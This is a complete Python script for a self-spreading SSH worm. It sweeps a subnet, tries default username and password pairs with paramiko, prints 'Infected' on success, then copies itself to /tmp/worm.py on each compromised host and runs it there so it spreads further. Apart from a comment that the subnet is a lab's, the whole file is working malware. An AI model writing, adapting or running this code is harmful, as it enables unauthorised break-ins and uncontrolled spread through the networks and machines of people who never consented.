import paramiko
import socket
import os
import sys
from multiprocessing import Pool

# Set your username and password guesses here
USERNAMES = ["root", "admin"]
PASSWORDS = ["toor", "admin", "123456"]
SUBNET = "192.168.56."  # Change to your lab subnet (e.g., 192.168.1.)

SELF = sys.argv[0]

def try_ssh(ip):
    for user in USERNAMES:
        for pwd in PASSWORDS:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, username=user, password=pwd, timeout=3)
                print(f"[+] Infected {ip} with {user}:{pwd}")

                sftp = ssh.open_sftp()
                sftp.put(SELF, "/tmp/worm.py")
                ssh.exec_command("python3 /tmp/worm.py &")
                sftp.close()
                ssh.close()
                return
            except (paramiko.ssh_exception.SSHException, socket.error):
                continue

def main():
    pool = Pool(processes=20)
    targets = [f"{SUBNET}{i}" for i in range(1, 255)]
    pool.map(try_ssh, targets)

if __name__ == "__main__":
    main()
